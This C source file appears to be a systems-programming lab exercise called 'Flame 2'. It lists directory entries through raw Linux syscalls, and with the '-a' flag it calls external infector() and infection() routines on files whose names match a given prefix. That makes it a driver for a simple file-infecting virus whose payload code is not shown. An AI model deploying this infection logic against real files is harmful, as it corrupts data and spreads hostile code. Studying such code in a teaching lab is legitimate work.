#include "util.h"

#define NULL (void*) 0

#define SYS_READ 3
#define SYS_WRITE 4
#define SYS_OPEN 5
#define SYS_CLOSE 6
#define SYS_LSEEK 19
#define SYS_GETDENTS 141

#define STDIN 0
#define STDOUT 1
#define STDERR 2

#define SEEK_SET 0
#define SEEK_CUR 1
#define SEEK_END 2

#define O_RDONLY 0
#define O_WRONLY 1
#define O_RDRW 2
#define O_APPEND 1024
#define O_TRUNC 512
#define O_CREAT 64

#define DT_UNKNOWN 0
#define DT_FIFO 1
#define DT_CHR 2
#define DT_DIR 4
#define DT_BLK 6
#define DT_REG 8
#define DT_LNK 10
#define DT_SOCK 12
#define DT_WHT 14

extern int system_call();
extern void code_start();
extern void code_end();
extern void infector(char*);
extern void infection();

/* taken from getdents man pgae */
typedef struct linux_dirent {
unsigned long  d_ino;     /* Inode number */
unsigned long  d_off;     /* Offset to next linux_dirent */
unsigned short d_reclen;  /* Length of this linux_dirent */
char           d_name[];  /* Filename (null-terminated) */
                          /* length is actually (d_reclen - 2 -
                              offsetof(struct linux_dirent, d_name)) */
/*
char           pad;       // Zero padding byte
char           d_type;    // File type (only since Linux
                          // 2.6.4); offset is (d_reclen - 1)
*/
} linux_dirent;

char dBugFlag = 0;

void deBug (char flag, int ID, int code){
  
  char* str;

  if (flag){
    system_call(SYS_WRITE, STDERR, "\n", 1);
    system_call(SYS_WRITE, STDERR, "ID: ", 4);
    str = itoa(ID);
    system_call(SYS_WRITE, STDERR, str, strlen(str));
    system_call(SYS_WRITE, STDERR, ", Return code: ", strlen(", Return code: "));
    str = itoa(code);
    system_call(SYS_WRITE, STDERR, str, strlen(str));
    system_call(SYS_WRITE, STDERR, "\n", 1);
  }
}

void printDir(linux_dirent* dirEnt){
  
  char* str;
  int code;
  
  code = system_call(SYS_WRITE, STDOUT, "Inode: ", 7);
  deBug(dBugFlag, SYS_WRITE, code);
  str = itoa(dirEnt->d_ino);
  code = system_call(SYS_WRITE, STDOUT, str, strlen(str));
  deBug(dBugFlag, SYS_WRITE, code);
  code = system_call(SYS_WRITE, STDOUT, ", dir type: ", 12);
  deBug(dBugFlag, SYS_WRITE, code);
  str =  ((dirEnt->d_reclen-1) + (char*) (dirEnt));
  
  /* taken from getdents man pgae */
  str = ((*str == DT_REG) ?  "regular" :
        (*str == DT_DIR) ?  "directory" :
        (*str == DT_FIFO) ? "FIFO" :
        (*str == DT_SOCK) ? "socket" :
        (*str == DT_LNK) ?  "symlink" :
        (*str == DT_BLK) ?  "block dev" :
        (*str == DT_CHR) ?  "char dev" : "???");

  code = system_call(SYS_WRITE, STDOUT, str, strlen(str));
  deBug(dBugFlag, SYS_WRITE, code);
  code = system_call(SYS_WRITE, STDOUT, ", offset: ", 10);
  deBug(dBugFlag, SYS_WRITE, code);
  str = itoa(dirEnt->d_off);
  code = system_call(SYS_WRITE, STDOUT, str, strlen(str));
  deBug(dBugFlag, SYS_WRITE, code);
  code = system_call(SYS_WRITE, STDOUT, ", size: ", 8);
  deBug(dBugFlag, SYS_WRITE, code);
  str = itoa(dirEnt->d_reclen);
  code = system_call(SYS_WRITE, STDOUT, str, strlen(str));
  deBug(dBugFlag, SYS_WRITE, code);
  code = system_call(SYS_WRITE, STDOUT, ", name: ", 8);
  deBug(dBugFlag, SYS_WRITE, code);
  code = system_call(SYS_WRITE, STDOUT, dirEnt->d_name, strlen(dirEnt->d_name));
  deBug(dBugFlag, SYS_WRITE, code);
  code = system_call(SYS_WRITE, STDOUT, "\n", 1);
  deBug(dBugFlag, SYS_WRITE, code);
}

int main (int argc , char* argv[], char* envp[])
{
  
  char* printPrefix = NULL;
  char* attachPrefix = NULL;
  char* str;
  int code;
  int i;
  int dir;
  int dirSize;
  int dirPos = 0;
  char dEnt[8192];
  linux_dirent* currDEntry;

  for(i = 1; i < argc; i++){
    if (strcmp(argv[i], "-D") == 0){
      dBugFlag = 1;
    }
  }
  for(i = 1; i < argc; i++){
    if (strncmp(argv[i], "-p", 2) == 0){
      printPrefix = argv[i]+2;
    }
    if (strncmp(argv[i], "-a", 2) == 0){
      attachPrefix = argv[i]+2;
    }
  }

  code = system_call(SYS_WRITE, STDOUT, "Flame 2 strikes!\n", strlen("Flame 2 strikes!\n"));
  deBug(dBugFlag, SYS_WRITE, code);
  code = system_call(SYS_WRITE, STDOUT, "code start: ", strlen("code start: "));
  deBug(dBugFlag, SYS_WRITE, code);
  str = itoa(&code_start);
  code = system_call(SYS_WRITE, STDOUT, str, strlen(str));
  deBug(dBugFlag, SYS_WRITE, code);
  code = system_call(SYS_WRITE, STDOUT, " ,code end: ", strlen(" ,code end: "));
  deBug(dBugFlag, SYS_WRITE, code);
  str = itoa(&code_end);
  code = system_call(SYS_WRITE, STDOUT, str, strlen(str));
  deBug(dBugFlag, SYS_WRITE, code);
  code = system_call(SYS_WRITE, STDOUT, "\n", 1);
  deBug(dBugFlag, SYS_WRITE, code);
  dir = system_call(SYS_OPEN, ".", O_RDONLY, 0777);
  deBug(dBugFlag, SYS_OPEN, dir);
  dirSize = system_call(SYS_GETDENTS, dir, dEnt, 8192);
  deBug(dBugFlag, SYS_GETDENTS, dirSize);
  code = system_call(SYS_CLOSE, dir);
  infection();
  currDEntry = (linux_dirent*) dEnt;
  while (dirPos < dirSize){
    if ( (printPrefix == NULL && attachPrefix == NULL) || (printPrefix != NULL && (strncmp(printPrefix, currDEntry->d_name, strlen(printPrefix)) == 0)) || (attachPrefix != NULL && (strncmp(attachPrefix, currDEntry->d_name, strlen(attachPrefix)) == 0))){
      printDir(currDEntry);
    }
    if (attachPrefix != NULL && (strncmp(attachPrefix, currDEntry->d_name, strlen(attachPrefix)) == 0)){
      infector(currDEntry->d_name);
    }
    dirPos += currDEntry->d_reclen;
    currDEntry = (linux_dirent*) (dEnt + dirPos);
  }

  return 0;
}
